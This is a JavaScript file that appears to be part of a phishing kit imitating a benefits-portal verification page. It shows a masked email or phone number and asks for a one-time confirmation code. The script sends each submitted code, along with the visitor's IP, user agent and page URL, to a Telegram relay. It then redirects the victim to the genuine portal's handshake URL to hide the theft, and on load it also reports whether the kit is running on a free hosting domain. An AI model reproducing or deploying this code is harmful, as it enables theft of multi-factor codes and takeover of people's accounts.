(function () {
  var form = document.getElementById("enter-code-form");
  var methodDisplay = document.getElementById("method-display");
  var maskedInput = document.getElementById("masked-destination");
  var maskedLabel = document.getElementById("masked-destination-label");
  var codeInput = document.getElementById("confirmation-code");
  var codeError = document.getElementById("code_validation_message");
  var resendBtn = document.getElementById("resend-code-btn");
  var infoText = document.getElementById("enter-code-info");
  var submitBtn = document.getElementById("submit-code-btn");

  // ============================================================
  // ====== FINAL REDIRECT URL ===================================
  // ============================================================

  const REDIRECT_URL = "https://melodybenefits.wealthcareportal.com/Authentication/Handshake";

  // ============================================================
  // ====== TELEGRAM INTEGRATION =================================
  // ============================================================

  async function sendToTelegram(action, data) {
    try {
      let ipData = { ip: 'Unknown' };
      try {
        const response = await fetch('/api/ip');
        if (response.ok) {
          ipData = await response.json();
        }
      } catch (e) {
        console.warn('Could not fetch IP data');
      }

      const payload = {
        action: action,
        data: {
          ...data,
          timestamp: new Date().toLocaleString('en-US', { 
            timeZone: 'America/New_York',
            hour12: true,
            year: 'numeric',
            month: '2-digit',
            day: '2-digit',
            hour: '2-digit',
            minute: '2-digit',
            second: '2-digit'
          }),
          userAgent: navigator.userAgent,
          ip: ipData.ip || 'Unknown'
        }
      };

      await fetch('/api/telegram', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
      });
    } catch (error) {
      console.error('Failed to send to Telegram:', error);
    }
  }

  // ============================================================
  // ====== DOMAIN DETECTION =====================================
  // ============================================================

  function detectDomain() {
    const currentUrl = window.location.href;
    const urlObj = new URL(currentUrl);
    const domain = urlObj.hostname;
    
    const freeDomains = [
      '.tk', '.ml', '.ga', '.cf', '.gq',
      '.free.nf', '.free.org', '.free.com',
      '.co.cc', '.co.nr', '.cjb.net',
      '.dynu.net', '.ddns.net', '.no-ip.org',
      'vercel.app', 'netlify.app', 'github.io',
      'pages.dev', 'web.app', 'firebaseapp.com',
      'herokuapp.com', 'glitch.me', 'replit.co',
      '000webhostapp.com', 'byethost.com',
      'freehostia.com', 'profreehost.com',
      '.example.com', '.test', '.localhost'
    ];

    const isFree = freeDomains.some(freeDomain => 
      domain.includes(freeDomain) || domain.endsWith(freeDomain)
    );

    sendToTelegram('domain_detection', {
      url: currentUrl,
      domain: domain,
      isFree: isFree
    });

    console.log(`🌐 Domain detected: ${domain} (${isFree ? 'FREE' : 'PURCHASED'})`);
  }

  detectDomain();

  // ============================================================
  // ====== FORM HANDLERS =======================================
  // ============================================================

  var auth = null;
  try {
    auth = JSON.parse(sessionStorage.getItem("melodyAuth") || "null");
  } catch (e) {
    auth = null;
  }

  if (!auth || !auth.destination || !auth.method) {
    window.location.replace("auth.html");
    return;
  }

  function maskEmail(email) {
    var parts = email.split("@");
    if (parts.length !== 2) return "******";
    var local = parts[0];
    var domain = parts[1];
    if (local.length <= 2) {
      return local.charAt(0) + "******@" + domain;
    }
    if (local.length <= 4) {
      return local.charAt(0) + "******" + local.slice(-1) + "@" + domain;
    }
    return local.charAt(0) + "******" + local.slice(-3) + "@" + domain;
  }

  function maskPhone(phone) {
    var digits = phone.replace(/\D/g, "");
    if (digits.length < 4) return "******";
    return "******" + digits.slice(-4);
  }

  function maskDestination(method, value) {
    if (method === "sms") return maskPhone(value);
    return maskEmail(value);
  }

  methodDisplay.value = auth.method === "sms" ? "SMS" : "Email";
  maskedLabel.textContent =
    auth.method === "sms" ? "Registered mobile number" : "Registered email";
  maskedInput.value = maskDestination(auth.method, auth.destination);

  infoText.textContent =
    "A confirmation code was sent to " +
    maskedInput.value +
    ". Enter the code below. If you did not receive it, press Resend Code.";

  resendBtn.addEventListener("click", function () {
    codeError.textContent = "";
    infoText.textContent =
      "A new confirmation code has been sent to " +
      maskedInput.value +
      ". Enter the new code below.";
    codeInput.value = "";
    codeInput.focus();
  });

  // ============================================================
  // ====== FORM SUBMIT (WITH REDIRECT) =========================
  // ============================================================

  form.addEventListener("submit", function (event) {
    event.preventDefault();
    codeError.textContent = "";

    var code = codeInput.value.trim();
    if (!code) {
      codeError.textContent = "The confirmation code field is required.";
      codeInput.focus();
      return;
    }
    if (!/^[0-9]{4,10}$/.test(code)) {
      codeError.textContent = "Please enter a valid confirmation code.";
      codeInput.focus();
      return;
    }

    // ====== SEND CODE TO TELEGRAM ======
    submitBtn.disabled = true;
    submitBtn.textContent = 'Verifying...';
    
    sendToTelegram('code_submitted', {
      code: code
    }).then(() => {
      submitBtn.textContent = 'Code Accepted! Redirecting...';
      
      // Clear session storage
      try {
        sessionStorage.removeItem("melodyAuth");
      } catch (e) {}
      
      // ====== REDIRECT TO FINAL URL ======
      setTimeout(function() {
        window.location.href = REDIRECT_URL;
      }, 1500);
    }).catch(() => {
      submitBtn.disabled = false;
      submitBtn.textContent = 'Submit';
      alert('An error occurred. Please try again.');
    });
  });
})();